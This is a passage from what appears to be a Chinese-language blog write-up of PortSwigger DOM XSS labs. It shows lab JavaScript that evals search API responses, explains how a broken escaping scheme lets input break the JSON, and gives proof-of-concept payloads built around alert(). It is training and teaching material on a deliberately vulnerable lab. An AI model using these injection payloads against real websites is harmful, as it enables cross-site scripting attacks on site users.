&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;blogHeader &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getElementsByClassName&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;blog-header&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;blogList &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getElementsByClassName&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;blog-list&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;searchTerm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;searchResultsObj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;searchTerm
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;searchResults &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;searchResultsObj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;results
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;h1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;h1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        h1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerText &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;searchResults&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot; search results for &amp;#39;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;searchTerm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;#39;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        blogHeader&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(h1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;hr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;hr&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        blogHeader&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(hr)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;searchResults&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;searchResult &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;searchResults[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;id) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;blogLink &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;a&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                blogLink&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;href&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;post?postId=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;id)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;headerImage) {
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;headerImage &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;img&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    headerImage&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;src&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;image&#x2F;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;headerImage)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    blogLink&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(headerImage)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                blogList&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(blogLink)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            blogList&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;lt;br&#x2F;&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;title) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;title &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;h2&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                title&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerText &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;title&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                blogList&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(title)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;summary) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;summary &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;p&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                summary&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerText &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;summary&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                blogList&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(summary)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;id) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;viewPostButton &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;a&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                viewPostButton&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;class&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;button is-small&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                viewPostButton&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;href&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;post?postId=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;searchResult&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;id)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                viewPostButton&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerText &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;View post&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;linkback &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;div&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        linkback&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;class&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;is-linkback&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;backToBlog &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;a&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        backToBlog&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;href&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        backToBlog&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerText &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Back to Blog&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        linkback&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(backToBlog)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        blogList&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(linkback)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;调用了&lt;code&gt;&#x2F;search-results?search=123&lt;&#x2F;code&gt;的 api 做了一个 ajax (应该算是吧)。脚本中直接拼接 responseText eval了，如果 api 可以注入那就可以实现 alert。&lt;&#x2F;p&gt;
&lt;p&gt;测试发现 api 的转义策略有问题，输入&lt;code&gt;\&quot;&lt;&#x2F;code&gt;返回就不是合法 json 了，escape 掉了一个引号&lt;&#x2F;p&gt;
&lt;p&gt;构造合法 json&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;\&amp;quot;-alert(window.origin)}&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;由于这个&lt;code&gt;-&lt;&#x2F;code&gt;仅仅是计算符号，改成&lt;code&gt;*&lt;&#x2F;code&gt;或&lt;code&gt;&#x2F;&lt;&#x2F;code&gt;都行。而&lt;code&gt;+&lt;&#x2F;code&gt;因为会被 http 协议认作空格所以不能正常利用。改成&lt;code&gt;%2B&lt;&#x2F;code&gt;就可以了&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;\&amp;quot;%2Balert()}&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-stored-dom-xss&quot;&gt;Lab: Stored &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;dom-based&quot;&gt;DOM XSS&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;随便点一个文章&lt;code&gt;Ctrl + U&lt;&#x2F;code&gt;可以看到没有评论。可以判断为前端渲染&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;loadComments&lt;&#x2F;span&gt;&lt;span&gt;(postCommentPath) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;xhr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    xhr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;onreadystatechange &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= function&lt;&#x2F;span&gt;&lt;span&gt;() {
